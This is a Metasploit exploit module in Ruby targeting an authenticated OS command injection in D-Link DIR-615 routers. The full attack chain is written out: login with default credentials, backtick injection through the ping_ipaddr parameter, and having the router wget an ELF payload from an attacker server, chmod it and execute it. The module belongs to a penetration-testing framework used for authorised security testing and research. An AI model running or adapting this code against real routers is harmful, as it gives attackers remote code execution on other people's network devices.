##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'D-Link DIR615h OS Command Injection',
      'Description' => %q{
          Some D-Link Routers are vulnerable to an authenticated OS command injection on
        their web interface, where default credentials are admin/admin or admin/password.
        Since it is a blind os command injection vulnerability, there is no output for the
        executed command when using the cmd generic payload. This module was tested against
        a DIR-615 hardware revision H1 - firmware version 8.04. A ping command against a
        controlled system could be used for testing purposes. The exploit uses the wget
        client from the device to convert the command injection into an arbitrary payload
        execution.
      },
      'Author'      =>
        [
          'Michael Messner <devnull@s3cur1ty.de>', # Vulnerability discovery and Metasploit module
          'juan vazquez' # minor help with msf module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'BID', '57882' ],
          [ 'EDB', '24477' ],
          [ 'OSVDB', '90174' ],
          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-008' ]
        ],
      'DisclosureDate' => 'Feb 07 2013',
      'Privileged'     => true,
      'Platform'       => ['linux','unix'],
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'Targets'        =>
        [
          [ 'CMD',
            {
            'Arch' => ARCH_CMD,
            'Platform' => 'unix'
            }
          ],
          [ 'Linux mipsel Payload',
            {
            'Arch' => ARCH_MIPSLE,
            'Platform' => 'linux'
            }
          ],
        ],
      'DefaultTarget'  => 1,
      ))

    register_options(
      [
        OptString.new('USERNAME', [ true, 'The username to authenticate as', 'admin' ]),
        OptString.new('PASSWORD', [ true, 'The password for the specified username', 'admin' ]),
        OptAddress.new('DOWNHOST', [ false, 'An alternative host to request the MIPS payload from' ]),
        OptString.new('DOWNFILE', [ false, 'Filename to download, (default: random)' ]),
        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the ELF payload request', 60])
      ], self.class)
  end


  def request(cmd)
    begin
      res = send_request_cgi({
        'uri'    => @uri,
        'method' => 'GET',
        'vars_get' => {
          "page" => "tools_vct",
          "hping" => "0",
          "ping_ipaddr" => "1.1.1.1`#{cmd}`",
          "ping6_ipaddr" => ""
        }
      })
      return res
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return nil
    end
  end

  def exploit
    downfile = datastore['DOWNFILE'] || rand_text_alpha(8+rand(8))
    @uri = '/tools_vct.htm'
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']
    @timeout = 5

    #
    # testing Login
    #
    print_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")
    begin
      res= send_request_cgi({
        'uri' => '/login.htm',
        'method' => 'POST',
        'vars_post' => {
          "page" => "login",
          "submitType" => "0",
          "identifier" => "",
          "sel_userid" => user,
          "userid" => "",
          "passwd" => pass,
          "captchapwd" => ""
        }
      })
      if res.nil? or res.code == 404
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
      end
      if res.body =~ /\<script\ langauge\=\"javascript\"\>showMainTabs\(\"setup\"\)\;\<\/script\>/
        print_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
      else
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
      end
    rescue ::Rex::ConnectionError
      fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{rport} - Failed to connect to the web server")
    end

    if target.name =~ /CMD/
      if not (datastore['CMD'])
        fail_with(Exploit::Failure::BadConfig, "#{rhost}:#{rport} - Only the cmd/generic payload is compatible")
      end
      cmd = payload.encoded
      res = request(cmd)
      if (!res)
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
      else
        print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state")
      end
      return
    end

    #thx to Juan for his awesome work on the mipsel elf support
    @pl = generate_payload_exe
    @elf_sent = false

    #
    # start our server
    #
    resource_uri = '/' + downfile

    if (datastore['DOWNHOST'])
      service_url = 'http://' + datastore['DOWNHOST'] + ':' + datastore['SRVPORT'].to_s + resource_uri
    else
      #do not use SSL
      if datastore['SSL']
        ssl_restore = true
        datastore['SSL'] = false
      end

      if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
        srv_host = Rex::Socket.source_address(rhost)
      else
        srv_host = datastore['SRVHOST']
      end

      service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri
      print_status("#{rhost}:#{rport} - Starting up our web service on #{service_url} ...")
      start_service({'Uri' => {
        'Proc' => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
        'Path' => resource_uri
      }})

      datastore['SSL'] = true if ssl_restore
    end

    #
    # download payload
    #
    print_status("#{rhost}:#{rport} - Asking the D-Link device to download #{service_url}")
    #this filename is used to store the payload on the device
    filename = rand_text_alpha_lower(8)

    #not working if we send all command together -> lets take three requests
    cmd = "/usr/bin/wget #{service_url} -O /tmp/#{filename}"
    res = request(cmd)
    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end

    # wait for payload download
    if (datastore['DOWNHOST'])
      print_status("#{rhost}:#{rport} - Giving #{datastore['HTTP_DELAY']} seconds to the D-Link device to download the payload")
      select(nil, nil, nil, datastore['HTTP_DELAY'])
    else
      wait_linux_payload
    end
    register_file_for_cleanup("/tmp/#{filename}")

    print_status("#{rhost}:#{rport} - Waiting #{@timeout} seconds for reloading the configuration")
    select(nil, nil, nil, @timeout)

    #
    # chmod
    #
    cmd = "chmod 777 /tmp/#{filename}"
    print_status("#{rhost}:#{rport} - Asking the D-Link device to chmod #{downfile}")
    res = request(cmd)
    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end
    print_status("#{rhost}:#{rport} - Waiting #{@timeout} seconds for reloading the configuration")
    select(nil, nil, nil, @timeout)

    #
    # execute
    #
    cmd = "/tmp/#{filename}"
    print_status("#{rhost}:#{rport} - Asking the D-Link device to execute #{downfile}")
    res = request(cmd)
    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end

  end

  # Handle incoming requests from the server
  def on_request_uri(cli, request)
    #print_status("on_request_uri called: #{request.inspect}")
    if (not @pl)
      print_error("#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!")
      return
    end
    print_status("#{rhost}:#{rport} - Sending the payload to the server...")
    @elf_sent = true
    send_response(cli, @pl)
  end

  # wait for the data to be sent
  def wait_linux_payload
    print_status("#{rhost}:#{rport} - Waiting for the victim to request the ELF payload...")

    waited = 0
    while (not @elf_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore['HTTP_DELAY'])
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Target didn't request request the ELF payload -- Maybe it cant connect back to us?")
      end
    end
  end

end
